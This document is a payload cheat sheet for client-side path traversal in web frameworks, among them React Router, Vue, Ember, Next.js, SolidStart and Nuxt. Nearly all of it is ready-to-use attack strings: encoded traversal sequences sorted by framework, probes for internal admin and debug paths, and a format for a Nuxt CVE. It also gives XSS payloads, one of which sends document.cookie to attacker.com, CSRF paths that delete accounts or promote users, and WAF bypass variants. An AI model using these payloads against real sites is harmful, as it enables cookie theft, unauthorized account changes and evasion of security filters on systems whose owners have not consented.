# CSPT Payload Reference

## Universal Payloads (work everywhere)

These work in query params and hash across all frameworks — no encoding needed.

```
# Query params — literal, no encoding required
../../target
../../../target
../../api/internal/users
../../admin
../../attachments/malicious

# Hash — also literal
#../../target
#../../admin/users
```

---

## Path Parameter Payloads by Framework

### React Router / Vue Router / Angular / SvelteKit / Nuxt (client)
These frameworks fully decode path params. Use percent-encoded slashes.

```
# Standard
..%2F..%2Ftarget
..%2F..%2F..%2Ftarget
..%2Fadmin
..%2Fapi%2Fadmin

# Dots also encoded
%2E%2E%2F%2E%2E%2Ftarget
%2e%2e%2f%2e%2e%2ftarget    # lowercase

# Mixed (literal dots + encoded slashes)
....%2F....%2Ftarget

# Null byte (passes through in React Router)
..%00%2Ftarget
```

### React Router — Double-Encode (unique to React Router)
React Router has a decode-then-replace mechanism that makes double-encode work:

```
..%252F..%252Ftarget          # %252F → %2F → / 
%252e%252e%252ftarget          # each component double-encoded
```

### Ember (:param routes)
Both of these produce `../admin` in params:

```
..%2fadmin                    # %2f encoded slash
%2e%2e%2fadmin                # dots also encoded
%2e%2e%2f%2e%2e%2ftarget      # full traversal, all encoded
```

### Ember (*wildcard routes)
Wildcard routes skip final decode — use literal `../` instead:

```
../../target                  # literal, works in wildcard
../../../target
```

Note: literal `../` in a path is resolved by the browser before JS sees it.
Use wildcard routes in situations where the browser won't normalize (e.g. programmatic navigation or query params).

### Next.js Route Handlers
Same payloads as React Router:

```
..%2F..%2Ftarget
%2E%2E%2F%2E%2E%2Ftarget
```

Remember: page components re-encode — only route handler `await params` is exploitable.

### SolidStart
Path params are NOT decoded. **Use query params instead:**

```
?source=../../target
?widget=../../attachments/malicious
?id=../../admin
```

---

## Catch-All / Splat Route Payloads

Catch-all routes use `(.*)` or equivalent regex, capturing across `/` boundaries.
Literal `../` works but browser normalizes it in the path. Use these approaches:

```
# Encoded (survives browser normalization in path)
..%2F..%2Ftarget              # standard

# For React splat (*), Vue /:pathMatch(.*)*
# Literal works if navigated to programmatically (not typed into address bar)
../../target
```

---

## Server-Side / Secondary Traversal Targets

When you identify a server-side sink, the traversal reaches internal services.
Focus on internal-looking API URLs:

```
# Probe for internal paths
..%2Finternal%2Fusers
..%2F..%2Fhealth
..%2F..%2Fmetrics
..%2F..%2Fadmin%2Fusers
..%2F..%2F_debug
..%2F..%2Fenv
..%2Fapi%2Fv1%2Fusers
```

For Nuxt island CSPT (CVE-2025-59414), the format is:
```
../../api/[target]?absorb=    # .json gets appended, query param absorbs it
```

---

## Encoding Variant Table

| Variant | Encoding | Works in |
|---|---|---|
| `..%2F` | `%2F` = `/` | React, Vue, Angular, SvelteKit, Ember(:param), Nuxt(client), Next.js(route handler) |
| `%2E%2E%2F` | `%2E` = `.` too | Same as above |
| `..%252F` | Double-encoded `/` | **React Router only** |
| `../../` | Literal | Catch-alls, query params, hash |
| `%2e%2e%2f` | Lowercase | Same as `%2E%2E%2F` |
| `..%00%2F` | Null byte + slash | React Router (null byte passes through) |
| `%C0%AF` | Overlong UTF-8 | NONE — `decodeURIComponent` rejects invalid UTF-8 |
| `．．／` | Fullwidth Unicode | NONE — no NFKC normalization in any framework |

---

## XSS Escalation Payloads

If CSPT redirects a fetch to an attacker endpoint returning HTML, pair with render sink:

```html
<!-- Basic alert -->
<img src=x onerror=alert(document.domain)>

<!-- Exfil via script -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

<!-- Stored: file to upload (name it something that gets fetched) -->
<svg onload=alert(document.domain)>

<!-- For endpoints that return JSON — break out if rendered via innerHTML -->
</script><img src=x onerror=alert(1)>
```

---

## CSRF Chain Payloads

CSPT as CSRF primitive — redirect fetch to a state-changing GET endpoint:

```
# Probe for GET-based state changes at traversed paths
../../api/users/me/delete
../../api/settings/reset
../../api/admin/users/promote
../../api/payments/confirm
```

---

## WAF Bypass Variants

If a WAF is blocking `../` or `%2F`:

```
# Case variation (servers may normalize)
..%2f    vs    ..%2F

# Double slash
..%2F%2F..%2Ftarget

# Semicolon (some servers strip)
..;%2Ftarget

# Encoded dot
%2E%2E%2F

# Mixed literal + encoded
.%2E%2F    .%2e%2Ftarget
```
